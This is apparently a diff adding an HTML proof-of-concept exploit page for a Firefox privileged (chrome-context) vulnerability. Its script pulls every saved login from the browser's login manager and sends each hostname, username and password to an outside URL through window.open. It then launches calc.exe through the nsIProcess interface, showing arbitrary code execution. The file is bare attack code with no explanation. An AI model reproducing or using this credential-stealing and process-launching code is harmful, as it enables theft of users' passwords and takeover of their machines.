@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+</head>
+<body>
+
+<script>
+
+// Get the login manager object 
+var l2m=Components.classes[ "@mozilla.org/loginmanager;1"].getService(Components.interfaces.nsILoginManager);
+// Get all credentials from the login manager 
+allCredentials = l2m.getAllLogins({}); 
+// Extract all the hosts, usernames and passwords 
+for (i=0;i<=allCredentials.length;i=i+1)
+{ 
+	var url = "http://www.facebook.com/"; 
+	url += "?host=" + encodeURI(allCredentials[i].hostname); 
+	url += "&user=" + encodeURI(allCredentials[i].username);
+	url += "&password=" + encodeURI(allCredentials[i].password); 
+	window.open(url); 
+	
+}
+	
+	
+	
+
+var lFile = Components.classes["@mozilla.org/file/local;1"] .createInstance(Components.interfaces.nsILocalFile);
+var lPath = "C:\\Windows\\SysWOW64\\calc.exe"; 
+lFile.initWithPath(lPath); 
+var process = Components.classes["@mozilla.org/process/util;1"] .createInstance(Components.interfaces.nsIProcess); 
+process.init(lFile); 
+process.run(false,[''],4);
+
+
+
+</script>
+
+</body>
+</html>
